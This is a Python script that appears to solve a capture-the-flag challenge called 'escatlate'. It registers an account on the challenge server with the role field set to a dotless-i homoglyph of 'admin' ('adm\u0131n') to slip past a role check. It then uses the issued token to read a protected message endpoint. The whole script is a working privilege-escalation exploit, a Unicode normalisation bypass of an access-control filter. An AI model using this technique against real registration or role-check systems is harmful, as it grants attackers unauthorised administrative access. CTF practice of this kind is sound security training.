import requests
import random
import string

def generate_username(prefix="user", length=6):
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{prefix}_{suffix}"
    
username = generate_username()
password = "password123"

print(f"User {username}:{password}")

# Register contants
url_register = "https://escatlate-52bc47e034fa.1753ctf.com/api/register"
register_payload = {
    "username": username,
    "password": password,
    "role": "adm\u0131n"
}

headers_register = {
    "Content-Type": "application/json",
}

# Send register request
response = requests.post(url_register, json=register_payload, headers=headers_register)
response_data = response.json()

# Get token from response
token = response_data.get("token")
print(f"Token: {token}")

# If getting token is succed get a flag
if token:
    url_message = "https://escatlate-52bc47e034fa.1753ctf.com/api/message"
    headers_message = {
        "X-Token": token
    }

    response_msg = requests.get(url_message, headers=headers_message)
    print("Response from: /api/message:")
    print(response_msg.text)
else:
    print("[Error] No token provided.")
